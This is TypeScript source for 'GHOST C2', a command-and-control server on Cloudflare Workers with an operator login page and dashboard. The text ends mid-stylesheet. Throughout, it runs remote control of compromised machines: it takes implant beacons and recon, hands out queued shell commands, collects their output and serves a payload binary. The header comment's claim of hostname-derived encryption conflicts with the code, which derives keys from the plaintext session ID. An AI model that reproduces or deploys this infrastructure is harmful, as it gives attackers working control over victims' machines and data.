/**
 * GHOST C2 — Cloudflare Worker (KV‑backed, encrypted)
 *
 * - URL‑decodes session IDs (fixes pipe issue).
 * - Hostname‑derived AES‑GCM (no PSK).
 * - Results kept by default; ?clear=1 removes.
 * - KV operations retried with exponential backoff.
 * - Safe JSON parsing — never throws on malformed bodies.
 * - All operator routes require X-Operator-Token; beacon routes require X-Beacon-Token.
 */

// ─── Environment ──────────────────────────────────────────

interface Env {
  GHOST_KV: KVNamespace;
  BEACON_TOKEN: string;
  OPERATOR_TOKEN: string;
  /** Dashboard login username */
  DASHBOARD_USER: string;
  /** Dashboard login password */
  DASHBOARD_PASS: string;
  /** Seconds before an idle session expires. Default: 600. */
  SESSION_TIMEOUT_SECONDS: string;
  /** Allowed CORS origin. Default: * */
  CORS_ORIGIN: string;
}

// ─── Domain Types ─────────────────────────────────────────

interface SessionData {
  session: string;
  remote_ip: string;
  first_seen: string;
  last_beacon: string;
  recon: Record<string, unknown>;
  pending_tasks: number;
  result_count: number;
}

interface ResultEntry {
  ts: string;
  output: string;
}

interface BeaconRequest {
  session?: string;
  enc?: string;          // encrypted JSON payload
}

interface ResultRequest {
  session?: string;
  enc?: string;          // encrypted output
}

interface TaskRequest {
  session: string;
  cmd: string;
}

interface AuditEntry {
  ts: string;
  ip: string;
  action: string;
  detail: Record<string, unknown>;
}

// ─── Constants ────────────────────────────────────────────

const MAX_SESSION_LEN = 128;
const MAX_CMD_LEN = 4096;
const MAX_OUTPUT_LEN = 65_536;
const RESULT_CAP = 500;
const RESULT_BYTE_CAP = 20 * 1024 * 1024; // 20 MB
const AUDIT_CAP = 1_000;
const AUDIT_TTL = 604_800; // 7 days
const TASK_TTL = 86_400;   // 24 hours
const PAYLOAD_MAX = 32 * 1024 * 1024; // 32 MB
const PAYLOAD_TTL = 86_400 * 30;

const KV_MAX_RETRIES = 3;
const KV_RETRY_BASE_MS = 200;

// ─── Crypto Helpers ───────────────────────────────────────

/**
 * Derive a 32‑byte AES key from the session ID using SHA‑256.
 * Both implant and Worker compute the same key from the same session ID.
 */
async function deriveKey(sid: string): Promise<Uint8Array> {
  const encoder = new TextEncoder();
  const data = encoder.encode(sid);
  const hash = await crypto.subtle.digest("SHA-256", data);
  return new Uint8Array(hash);
}

async function decryptAesGcm(keyBytes: Uint8Array, b64Ciphertext: string): Promise<string> {
  const data = Uint8Array.from(atob(b64Ciphertext), c => c.charCodeAt(0));
  if (data.length < 28) throw new Error("Ciphertext too short");
  const iv = data.slice(0, 12);
  const tag = data.slice(12, 28);
  const ct = data.slice(28);

  const ctWithTag = new Uint8Array(ct.length + tag.length);
  ctWithTag.set(ct, 0);
  ctWithTag.set(tag, ct.length);

  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, ctWithTag);
  return new TextDecoder().decode(decrypted);
}

async function encryptAesGcm(keyBytes: Uint8Array, plaintext: string): Promise<string> {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, new TextEncoder().encode(plaintext));

  const buf = new Uint8Array(encrypted);
  const ct = buf.slice(0, buf.length - 16);
  const tag = buf.slice(buf.length - 16);

  const out = new Uint8Array(12 + 16 + ct.length);
  out.set(iv, 0);
  out.set(tag, 12);
  out.set(ct, 28);

  return btoa(String.fromCharCode(...out));
}

// ─── Helpers ──────────────────────────────────────────────

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorResponse(message: string, status: number): Response {
  return jsonResponse({ error: message }, status);
}

function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  const enc = new TextEncoder();
  const bufA = enc.encode(a);
  const bufB = enc.encode(b);
  let diff = 0;
  for (let i = 0; i < bufA.length; i++) diff |= bufA[i] ^ bufB[i];
  return diff === 0;
}

function getClientIP(request: Request): string {
  return (
    request.headers.get("CF-Connecting-IP") ??
    request.headers.get("X-Real-IP") ??
    "unknown"
  );
}

function clamp(s: string, max: number): string {
  return s.length > max ? s.slice(0, max) : s;
}

function getSessionTTL(env: Env): number {
  const v = parseInt(env.SESSION_TIMEOUT_SECONDS || "600", 10);
  return Number.isFinite(v) && v > 0 ? v : 600;
}

function now(): string {
  return new Date().toISOString();
}

async function safeJson<T>(request: Request): Promise<T | null> {
  try {
    return (await request.json()) as T;
  } catch {
    return null;
  }
}

function withCORS(response: Response, env: Env): Response {
  const origin = env.CORS_ORIGIN || "*";
  const h = new Headers(response.headers);
  h.set("Access-Control-Allow-Origin", origin);
  h.set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  h.set("Access-Control-Allow-Headers", "Content-Type, X-Beacon-Token, X-Operator-Token");
  h.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: h,
  });
}

// ─── KV: Retry Wrapper ────────────────────────────────────

async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
  let lastErr: Error | undefined;
  for (let attempt = 0; attempt < KV_MAX_RETRIES; attempt++) {
    try {
      return await fn();
    } catch (err) {
      lastErr = err as Error;
      if (attempt < KV_MAX_RETRIES - 1) {
        await new Promise(r => setTimeout(r, KV_RETRY_BASE_MS * (attempt + 1)));
      }
    }
  }
  throw lastErr ?? new Error("KV operation failed after retries");
}

// ─── KV: Session ──────────────────────────────────────────

function sessionKey(sid: string): string { return `session:${sid}`; }
function tasksKey(sid: string): string { return `tasks:${sid}`; }
function resultsKey(sid: string): string { return `results:${sid}`; }

async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
  return withRetry(async () => {
    const raw = await kv.get(sessionKey(sid));
    return raw ? JSON.parse(raw) as SessionData : null;
  });
}

async function putSession(
  kv: KVNamespace,
  sid: string,
  data: SessionData,
  ttl: number,
): Promise<void> {
  await withRetry(() =>
    kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: ttl }),
  );
}

// ─── KV: Tasks ────────────────────────────────────────────

async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
  return withRetry(async () => {
    const raw = await kv.get(tasksKey(sid));
    return raw ? JSON.parse(raw) as string[] : [];
  });
}

async function putTasks(
  kv: KVNamespace,
  sid: string,
  tasks: string[],
  sessionTtl = TASK_TTL,
): Promise<void> {
  await withRetry(async () => {
    if (tasks.length === 0) {
      await kv.delete(tasksKey(sid));
    } else {
      await kv.put(tasksKey(sid), JSON.stringify(tasks), { expirationTtl: TASK_TTL });
    }
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.pending_tasks = tasks.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

// ─── KV: Results ──────────────────────────────────────────

async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
  return withRetry(async () => {
    const raw = await kv.get(resultsKey(sid));
    return raw ? JSON.parse(raw) as ResultEntry[] : [];
  });
}

async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
  await withRetry(() => {
    if (results.length === 0) return kv.delete(resultsKey(sid));
    return kv.put(resultsKey(sid), JSON.stringify(results), { expirationTtl: TASK_TTL });
  });
}

async function appendResult(
  kv: KVNamespace,
  sid: string,
  entry: ResultEntry,
  sessionTtl: number,
): Promise<void> {
  await withRetry(async () => {
    const results = await getResults(kv, sid);
    if (results.length >= RESULT_CAP) results.shift();
    results.push(entry);
    while (results.length > 1 && JSON.stringify(results).length > RESULT_BYTE_CAP) {
      results.shift();
    }
    await putResults(kv, sid, results);
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.result_count = results.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
  return withRetry(async () => {
    const keys: string[] = [];
    let cursor: string | undefined;
    do {
      const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
      for (const k of result.keys) keys.push(k.name);
      cursor = result.list_complete ? undefined : result.cursor;
    } while (cursor);
    return keys;
  });
}

async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
  await withRetry(async () => {
    const raw = await kv.get("audit_log");
    const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
    if (log.length >= AUDIT_CAP) log.splice(0, log.length - (AUDIT_CAP - 1));
    log.push(entry);
    await kv.put("audit_log", JSON.stringify(log), { expirationTtl: AUDIT_TTL });
  });
}

// ─── Auth Middleware ───────────────────────────────────────

function requireBeaconToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Beacon-Token") ?? "";
  if (!env.BEACON_TOKEN || !secureCompare(token, env.BEACON_TOKEN)) {
    console.log(`[auth] beacon failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

function requireOperatorToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Operator-Token") ?? "";
  if (!env.OPERATOR_TOKEN || !secureCompare(token, env.OPERATOR_TOKEN)) {
    console.log(`[auth] operator failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

// ─── Route Handlers ───────────────────────────────────────

async function handleBeacon(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<BeaconRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ts = now();
  const ip = getClientIP(request);
  const ttl = getSessionTTL(env);

  // Derive AES key from session ID
  const keyBytes = await deriveKey(sid);

  let recon: Record<string, unknown> = {};
  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      recon = parsed.recon ?? {};
    } catch (e) {
      console.error(`[beacon] sid=${sid} ip=${ip} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    // Fallback for plaintext (if implant sends without encryption)
    recon = body.recon ?? {};
  }

  const existing = await getSession(env.GHOST_KV, sid);
  const session: SessionData = {
    session: sid,
    remote_ip: ip,
    first_seen: existing?.first_seen ?? ts,
    last_beacon: ts,
    recon: recon,
    pending_tasks: existing?.pending_tasks ?? 0,
    result_count: existing?.result_count ?? 0,
  };
  await putSession(env.GHOST_KV, sid, session, ttl);

  const tasks = await getTasks(env.GHOST_KV, sid);
  let cmd = "sleep";
  if (tasks.length > 0) {
    cmd = tasks.shift()!;
    await putTasks(env.GHOST_KV, sid, tasks, ttl);
    console.log(`[beacon] sid=${sid} ip=${ip} tasked="${cmd}"`);
  } else {
    console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
  }

  const plainResponse = JSON.stringify({ cmd });
  const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
  return jsonResponse({ enc: encryptedResponse });
}

async function handleResult(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<ResultRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ttl = getSessionTTL(env);
  const keyBytes = await deriveKey(sid);

  let output = "";
  if (body.enc) {
    try {
      const decrypted = await decryptAesGcm(keyBytes, body.enc);
      const parsed = JSON.parse(decrypted);
      output = parsed.output ?? "";
    } catch (e) {
      console.error(`[result] sid=${sid} decrypt failed: ${e}`);
      return errorResponse("Decryption failed", 400);
    }
  } else {
    output = body.output ?? "";
  }

  const trimmed = clamp(output, MAX_OUTPUT_LEN);
  await appendResult(env.GHOST_KV, sid, { ts: now(), output: trimmed }, ttl);

  // If session doesn't exist, create it (shouldn't happen, but safe)
  const existing = await getSession(env.GHOST_KV, sid);
  if (!existing) {
    const ts = now();
    await putSession(env.GHOST_KV, sid, {
      session: sid,
      remote_ip: getClientIP(request),
      first_seen: ts,
      last_beacon: ts,
      recon: {},
      pending_tasks: 0,
      result_count: 1,
    }, ttl);
  }

  console.log(`[result] sid=${sid} len=${trimmed.length}`);
  return jsonResponse({ status: "ok" });
}

async function handleListSessions(request: Request, env: Env): Promise<Response> {
  const keys = await listSessionKeys(env.GHOST_KV);
  const ts = Date.now();
  const sessions: Record<string, unknown>[] = [];

  for (const key of keys) {
    const sid = key.replace("session:", "");
    const data = await getSession(env.GHOST_KV, sid);
    if (!data) continue;
    sessions.push({
      session: data.session,
      remote_ip: data.remote_ip,
      first_seen: data.first_seen,
      last_beacon: data.last_beacon,
      idle_seconds: Math.round((ts - new Date(data.last_beacon).getTime()) / 1000),
      recon: data.recon,
      pending_tasks: data.pending_tasks ?? 0,
      result_count: data.result_count ?? 0,
    });
  }

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "list_sessions",
    detail: { count: sessions.length },
  });

  return jsonResponse(sessions);
}

async function handleAddTask(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<TaskRequest>(request);
  if (!body?.session || !body?.cmd) {
    return errorResponse("Missing session or cmd field", 400);
  }

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const cmd = clamp(String(body.cmd), MAX_CMD_LEN);

  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.push(cmd);
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "task_queued",
    detail: { session: sid, cmd },
  });

  console.log(`[task] sid=${sid} cmd="${cmd}" depth=${tasks.length}`);
  return jsonResponse({ status: "queued", queue_depth: tasks.length });
}

async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
  // sid is already decoded by router
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const results = await getResults(env.GHOST_KV, sid);
  const clear = new URL(request.url).searchParams.get("clear") === "1";
  if (clear) await putResults(env.GHOST_KV, sid, []);

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "get_results",
    detail: { session: sid, count: results.length, clear },
  });

  return jsonResponse({ session: sid, results });
}

async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.unshift("exit");
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "kill_session",
    detail: { session: sid },
  });

  console.log(`[kill] sid=${sid} exit queued`);
  return jsonResponse({ status: "exit_queued", session: sid });
}

async function handleAudit(request: Request, env: Env): Promise<Response> {
  const limit = Math.min(
    parseInt(new URL(request.url).searchParams.get("limit") ?? "100", 10),
    AUDIT_CAP,
  );
  const raw = await env.GHOST_KV.get("audit_log");
  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
  return jsonResponse({ entries: log.slice(-limit) });
}

function handleHealth(): Response {
  return jsonResponse({ status: "ok", ts: now() });
}

async function handleUploadPayload(request: Request, env: Env): Promise<Response> {
  const body = await request.arrayBuffer();
  if (!body || body.byteLength === 0) return errorResponse("Empty body", 400);
  if (body.byteLength > PAYLOAD_MAX) return errorResponse("Payload too large (max 32 MB)", 413);

  await env.GHOST_KV.put("payload:ghost", body, { expirationTtl: PAYLOAD_TTL });
  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "payload_uploaded",
    detail: { bytes: body.byteLength },
  });

  console.log(`[payload] uploaded ${body.byteLength} bytes`);
  return jsonResponse({ status: "ok", bytes: body.byteLength });
}

async function handleDownloadPayload(env: Env): Promise<Response> {
  const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
  if (!raw) return errorResponse("Payload not found", 404);
  return new Response(raw, {
    status: 200,
    headers: {
      "Content-Type": "application/octet-stream",
      "Content-Length": String(raw.byteLength),
      "Cache-Control": "no-store",
    },
  });
}

// ─── Dashboard HTML ───────────────────────────────────────

const LOGIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST // AUTH</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080a0e;--surface:#0d1117;--border:#1a2030;--accent:#00ff88;
  --accent-dim:#00ff8833;--red:#ff3b5c;--yellow:#f0c040;
  --text:#c9d1d9;--muted:#484f58;--mono:'JetBrains Mono','Fira Code',monospace;
}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono),monospace}
body{display:flex;align-items:center;justify-content:center;min-height:100dvh;position:relative;overflow:hidden}
.scanline{position:fixed;inset:0;pointer-events:none;z-index:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.015) 2px,rgba(0,255,136,0.015) 4px)}
.grid-bg{position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
  background-size:40px 40px;opacity:.4}
.panel{position:relative;z-index:1;width:360px;border:1px solid var(--border);background:var(--surface);padding:40px 36px}
.panel::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent)}
.logo{font-size:11px;letter-spacing:.3em;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
.title{font-size:22px;font-weight:700;letter-spacing:.08em;color:var(--accent);margin-bottom:4px;text-shadow:0 0 20px rgba(0,255,136,.4)}
.subtitle{font-size:10px;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;margin-bottom:32px}
.field{margin-bottom:16px}
.field label{display:block;font-size:10px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
.field input{width:100%;background:#0a0d14;border:1px solid var(--border);color:var(--text);padding:10px 12px;
  font-family:var(--mono);font-size:13px;outline:none;transition:border-color .2s}
.field input:focus{border-color:var(--accent)}
.field input::placeholder{color:var(--muted)}
.btn{width:100%;background:transparent;border:1px solid var(--accent);color:var(--accent);padding:11px;
  font-family:var(--mono);font-size:12px;letter-spacing:.15em;text-transform:uppercase;cursor:pointer;
  transition:background .15s,box-shadow .15s;margin-top:8px}
.btn:hover{background:var(--accent-dim);box-shadow:0 0 16px rgba(0,255,136,.2)}
.btn:active{transform:scale(.99)}
.err{font-size:11px;color:var(--red);letter-spacing:.05em;margin-top:16px;padding:8px;border:1px solid rgba(255,59,92,.2);background:rgba(255,59,92,.05);display:none}
.err.show{display:block}
.corner{position:absolute;width:8px;height:8px;border-color:var(--accent);border-style:solid;opacity:.6}
.corner.tl{top:-1px;left:-1px;border-width:1px 0 0 1px}
.corner.tr{top:-1px;right:-1px;border-width:1px 1px 0 0}
.corner.bl{bottom:-1px;left:-1px;border-width:0 0 1px 1px}
.corner.br{bottom:-1px;right:-1px;border-width:0 1px 1px 0}
</style>
</head>
<body>
<div class="grid-bg"></div>
<div class="scanline"></div>
<div class="panel">
  <div class="corner tl"></div><div class="corner tr"></div>
  <div class="corner bl"></div><div class="corner br"></div>
  <div class="logo">GHOST FRAMEWORK</div>
  <div class="title">C2 CONSOLE</div>
  <div class="subtitle">Operator Authentication Required</div>
  <form id="f" onsubmit="login(event)">
    <div class="field">
      <label>Username</label>
      <input id="u" type="text" placeholder="operator" autocomplete="username" required>
    </div>
    <div class="field">
      <label>Password</label>
      <input id="p" type="password" placeholder="••••••••••••" autocomplete="current-password" required>
    </div>
    <button class="btn" type="submit">[ AUTHENTICATE ]</button>
  </form>
  <div class="err" id="err">ACCESS DENIED — invalid credentials</div>
</div>
<script>
async function login(e) {
  e.preventDefault();
  const btn = document.querySelector('.btn');
  btn.textContent = '[ AUTHENTICATING... ]';
  btn.disabled = true;
  const r = await fetch('/auth', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
  });
  if (r.ok) {
    const {token} = await r.json();
    sessionStorage.setItem('ghost_token', token);
    location.href = '/dashboard';
  } else {
    document.getElementById('err').classList.add('show');
    btn.textContent = '[ AUTHENTICATE ]';
    btn.disabled = false;
  }
}
</script>
</body>
</html>`;

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST C2 // CONSOLE</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080a0e;--surface:#0d1117;--surface2:#111820;--border:#1a2030;
  --accent:#00ff88;--accent-dim:#00ff8820;--accent-glow:rgba(0,255,136,.35);
  --red:#ff3b5c;--yellow:#f0c040;--blue:#4fc3f7;--orange:#ff8c42;
  --text:#c9d1d9;--muted:#484f58;--muted2:#30363d;
  --mono:'JetBrains Mono','Fira Code',monospace;
}
html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:12px}
/* scanline overlay */
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px)}

/* ── HEADER ───────────────────────────────────────────── */
header{height:44px;display:flex;align-items:center;gap:0;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;position:relative;z-index:10}
header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:.4}
.hdr-logo{padding:0 16px;display:flex;align-items:center;gap:10px;border-right:1px solid var(--border);height:100%}
.hdr-logo .ghost{font-size:13px;font-weight:700;letter-spacing:.1em;color:var(--accent);text-shadow:0 0 12px var(--accent-glow)}
.hdr-logo .c2{font-size:10px;letter-spacing:.2em;color:var(--muted);margin-left:2px}
.hdr-status{padding:0 16px;display:flex;align-items:center;gap:8px;border-right:1px solid var(--border);height:100%}
.pulse{width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:background .3s,box-shadow .3s}
.pulse.live{background:var(--accent);box-shadow:0 0 8px var(--accent-glow)}
.pulse.warn{background:var(--yellow)}
.status-txt{font-size:10px;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
.hdr-meta{padding:0 16px;display:flex;gap:16px;align-items:center;font-size:10px;color:var(--muted);border-right:1px solid var(--border);height:100%}
.hdr-meta span{color:var(--text)}
.hdr-right{margin-left:auto;padding:0 16px;display:flex;align-items:center;gap:8px}
.hdr-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:4px 10px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s}
.hdr-btn:hover{border-color:var(--accent);color:var(--accent)}
.hdr-btn.danger:hover{border-color:var(--red);color:var(--red)}
#clock{font-size:10px;color:var(--muted);letter-spacing:.05em}

/* ── LAYOUT ───────────────────────────────────────────── */
.workspace{display:flex;flex:1;height:calc(100dvh - 44px);overflow:hidden}

/* ── SIDEBAR ──────────────────────────────────────────── */
#sidebar{width:240px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px solid var(--border);background:var(--surface)}
.pane-head{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--surface2)}
.pane-label{font-size:9px;letter-spacing:.2em;color:var(--muted);text-transform:uppercase}
.icon-btn{background:transparent;border:none;color:var(--muted);cursor:pointer;font-family:var(--mono);font-size:11px;padding:2px 4px;transition:color .15s}
.icon-btn:hover{color:var(--accent)}
#session-list{flex:1;overflow-y:auto}
.no-sessions{padding:20px 12px;color:var(--muted);font-size:10px;letter-spacing:.05em}
.session-item{padding:10px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s;position:relative}
.session-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:transparent;transition:background .1s}
.session-item:hover{background:var(--surface2)}
.session-item.active{background:#0d1f15}
.session-item.active::before{background:var(--accent)}
.sid{font-size:10px;font-weight:700;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.05em}
.smeta{color:var(--muted);font-size:9px;margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.sbadge{display:inline-flex;align-items:center;gap:4px;margin-top:5px;padding:2px 6px;font-size:9px;letter-spacing:.08em;text-transform:uppercase;border:1px solid}
.sbadge.live{border-color:rgba(0,255,136,.3);color:var(--accent)}
.sbadge.tasks{border-color:rgba(240,192,64,.3);color:var(--yellow)}
.sbadge.stale{border-color:rgba(255,59,92,.3);color:var(--red)}
.sbadge-dot{width:4px;height:4px;border-radius:50%;background:currentColor}

/* ── MAIN CONTENT ─────────────────────────────────────── */
#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
#tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0}
.tab{padding:0 18px;height:36px;display:flex;align-items:center;font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;gap:6px}
.tab:hover{color:var(--text)}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-count{background:var(--surface2);padding:1px 5px;font-size:9px;color:var(--muted)}
.tab.active .tab-count{background:var(--accent-dim);color:var(--accent)}

#session-header{padding:8px 14px;border-bottom:1px solid var(--border);background:var(--surface2);display:none;align-items:center;gap:10px;flex-wrap:wrap;flex-shrink:0}
.sel-sid{font-size:11px;font-weight:700;color:var(--accent);letter-spacing:.06em}
.sel-meta{font-size:10px;color:var(--muted);flex:1}
.sel-actions{display:flex;gap:6px}
.act-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:all .15s}
.act-btn:hover{border-color:var(--accent);color:var(--accent)}
.act-btn.kill:hover{border-color:var(--red);color:var(--red)}

#empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;color:var(--muted)}
.empty-glyph{font-size:28px;opacity:.3;letter-spacing:.2em}
.empty-msg{font-size:11px;letter-spacing:.15em;text-transform:uppercase;opacity:.5}

#output-pane{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;display:none}
#recon-pane{flex:1;overflow-y:auto;padding:12px;display:none}

/* result entries */
.result-entry{border:1px solid var(--border);overflow:hidden}
.result-ts{padding:4px 10px;background:var(--surface2);color:var(--muted);font-size:9px;letter-spacing:.08em;border-bottom:1px solid var(--border);display:flex;gap:8px}
.result-ts .ts-label{color:var(--accent);font-weight:700}
.result-body{padding:10px;white-space:pre-wrap;word-break:break-all;color:var(--text);line-height:1.7;max-height:320px;overflow-y:auto;font-size:11px}

/* recon grid */
.recon-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
.recon-cell{border:1px solid var(--border);padding:10px 12px;background:var(--surface2)}
.recon-key{font-size:9px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase;margin-bottom:4px}
.recon-val{font-size:12px;color:var(--text);word-break:break-all}
.recon-val.hi{color:var(--accent)}
.recon-val.warn{color:var(--yellow)}
.recon-val.danger{color:var(--red)}

/* ── COMMAND BAR ──────────────────────────────────────── */
#cmd-bar{padding:10px 12px;border-top:1px solid var(--border);background:var(--surface);display:none;flex-shrink:0}
.cmd-row{display:flex;gap:6px;margin-bottom:6px}
.cmd-prompt{color:var(--accent);font-size:12px;padding:7px 0;flex-shrink:0;letter-spacing:.05em}
#cmd-input{flex:1;background:#050810;border:1px solid var(--border);color:var(--accent);padding:7px 10px;font-family:var(--mono);font-size:12px;outline:none;caret-color:var(--accent)}
#cmd-input:focus{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent-dim)}
#cmd-input::placeholder{color:var(--muted)}
.quick-cmds{display:flex;gap:4px;flex-wrap:wrap}
.qcmd{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:9px;letter-spacing:.08em;cursor:pointer;text-transform:uppercase;transition:all .15s}
.qcmd:hover{border-color:var(--accent);color:var(--accent)}

/* ── AUDIT PANEL ──────────────────────────────────────── */
#audit-panel{width:260px;flex-shrink:0;display:flex;flex-direction:column;border-left:1px solid var(--border);background:var(--surface)}
#audit-list{flex:1;overflow-y:auto;padding:6px}
.audit-entry{padding:6px 8px;margin-bottom:2px;border-left:2px solid transparent;font-size:9px}
.audit-entry.list_sessions{border-left-color:var(--muted2)}
.audit-entry.task_queued{border-left-color:var(--yellow)}
.audit-entry.kill_session{border-left-color:var(--red)}
.audit-entry.get_results{border-left-color:var(--blue)}
.audit-entry.payload_uploaded{border-left-color:var(--orange)}
.a-time{color:var(--muted);letter-spacing:.03em;margin-bottom:2px}
.a-action{color:var(--text);font-weight:700;letter-spacing:.06em;text-transform:uppercase}
.a-ip{color:var(--muted);font-size:8px;margin-top:1px}

/* ── TOAST ────────────────────────────────────────────── */
#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--surface2);border:1px solid var(--border);padding:8px 16px;font-size:11px;letter-spacing:.06em;opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;white-space:nowrap}
#toast.show{opacity:1}
#toast.ok{border-color:rgba(0,255,136,.4);color:var(--accent)}
#toast.err{border-color:rgba(255,59,92,.4);color:var(--red)}

